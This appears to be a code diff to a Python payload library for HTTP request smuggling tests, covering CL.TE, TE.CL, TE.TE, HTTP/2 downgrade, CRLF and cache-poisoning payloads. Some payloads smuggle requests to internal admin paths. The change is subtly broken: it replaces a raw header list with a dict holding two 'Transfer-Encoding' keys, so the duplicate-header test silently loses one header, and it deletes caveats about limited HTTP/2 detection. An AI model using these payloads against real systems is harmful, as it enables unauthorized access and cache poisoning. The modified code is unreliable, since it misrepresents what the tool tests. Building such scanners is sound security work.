@@ -4,7 +4,7 @@ All known smuggling techniques and their payloads
 """
 
 from dataclasses import dataclass, field
-from typing import List, Optional, Tuple
+from typing import List, Optional
 
 
 @dataclass
@@ -18,10 +18,9 @@ class SmugglePayload:
     expected_behavior: str
     references: List[str] = field(default_factory=list)
     tags: List[str] = field(default_factory=list)
-    raw_headers: List[Tuple[str, str]] = field(default_factory=list)
 
 
-# --- CL.TE Payloads ---
+# ─── CL.TE Payloads ───────────────────────────────────────────────────────────
 
 CL_TE_BASIC = SmugglePayload(
     name="CL.TE Basic",
@@ -55,7 +54,7 @@ CL_TE_TIMEOUT = SmugglePayload(
     tags=["cl.te", "timing", "detection"],
 )
 
-# --- TE.CL Payloads ---
+# ─── TE.CL Payloads ───────────────────────────────────────────────────────────
 
 TE_CL_BASIC = SmugglePayload(
     name="TE.CL Basic",
@@ -89,7 +88,7 @@ TE_CL_TIMEOUT = SmugglePayload(
     tags=["te.cl", "timing", "detection"],
 )
 
-# --- TE.TE Obfuscation Payloads ---
+# ─── TE.TE Obfuscation Payloads ───────────────────────────────────────────────
 
 TE_TE_SPACE_BEFORE_COLON = SmugglePayload(
     name="TE.TE Space Before Colon",
@@ -115,17 +114,13 @@ TE_TE_DUPLICATE_HEADER = SmugglePayload(
     headers={
         "Content-Type": "application/x-www-form-urlencoded",
         "Content-Length": "6",
+        "Transfer-Encoding": "chunked",
+        "Transfer-Encoding": "identity",  # Duplicate — overrides in some parsers
     },
     body="0\r\n\r\nG",
     expected_behavior="One proxy uses 'chunked', other uses 'identity', causing desync",
     references=["https://portswigger.net/web-security/request-smuggling"],
     tags=["te.te", "obfuscation", "duplicate"],
-    raw_headers=[
-        ("Content-Type", "application/x-www-form-urlencoded"),
-        ("Content-Length", "6"),
-        ("Transfer-Encoding", "chunked"),
-        ("Transfer-Encoding", "identity"),
-    ],
 )
 
 TE_TE_JUNK_CHUNK = SmugglePayload(
@@ -176,9 +171,7 @@ TE_TE_NULL_BYTE = SmugglePayload(
     tags=["te.te", "obfuscation", "null-byte"],
 )
 
-# --- HTTP/2 Downgrade Smuggling ---
-# NOTE: H2 smuggling requires raw HTTP/2 frame construction for full effectiveness.
-# Current httpx-based detection is limited — see detect_h2_smuggling() for details.
+# ─── HTTP/2 Downgrade Smuggling ───────────────────────────────────────────────
 
 H2_CL_SMUGGLING = SmugglePayload(
     name="H2.CL Smuggling",
@@ -208,7 +201,7 @@ H2_TE_SMUGGLING = SmugglePayload(
         "Transfer-Encoding": "chunked",
     },
     body="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
-    expected_behavior="HTTP/2 -> HTTP/1.1 downgrade with TE header forwarded — backend processes smuggled request",
+    expected_behavior="HTTP/2 → HTTP/1.1 downgrade with TE header forwarded — backend processes smuggled request",
     references=["https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors"],
     tags=["h2", "h2.te", "downgrade", "critical"],
 )
@@ -216,7 +209,7 @@ H2_TE_SMUGGLING = SmugglePayload(
 H2_REQUEST_LINE_INJECTION = SmugglePayload(
     name="H2 Request Line Injection",
     technique="H2.RL",
-    description="Newline injection in HTTP/2 pseudo-headers to inject a second request (requires raw HTTP/2 frame construction)",
+    description="Newline injection in HTTP/2 pseudo-headers to inject a second request",
     severity="critical",
     headers={
         "Content-Type": "application/x-www-form-urlencoded",
@@ -227,7 +220,7 @@ H2_REQUEST_LINE_INJECTION = SmugglePayload(
     tags=["h2", "header-injection", "critical"],
 )
 
-# --- Header Injection / CRLF ---
+# ─── Header Injection / CRLF ──────────────────────────────────────────────────
 
 CRLF_HEADER_INJECTION = SmugglePayload(
     name="CRLF Header Injection",
@@ -244,7 +237,7 @@ CRLF_HEADER_INJECTION = SmugglePayload(
     tags=["crlf", "header-injection"],
 )
 
-# --- Cache Poisoning via Smuggling ---
+# ─── Cache Poisoning via Smuggling ────────────────────────────────────────────
 
 CACHE_POISON_SMUGGLE = SmugglePayload(
     name="Cache Poisoning via Smuggling",
@@ -262,7 +255,7 @@ CACHE_POISON_SMUGGLE = SmugglePayload(
     tags=["cl.te", "cache-poisoning", "critical"],
 )
 
-# --- All Payloads Registry ---
+# ─── All Payloads Registry ────────────────────────────────────────────────────
 
 ALL_PAYLOADS: List[SmugglePayload] = [
     CL_TE_BASIC,
@@ -290,6 +283,9 @@ TECHNIQUES = {
     "H2.RL": [p for p in ALL_PAYLOADS if p.technique == "H2.RL"],
     "CRLF":  [p for p in ALL_PAYLOADS if p.technique == "CRLF"],
 }
+
+SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+
 
 def get_payloads_by_technique(technique: str) -> List[SmugglePayload]:
     return TECHNIQUES.get(technique.upper(), [])
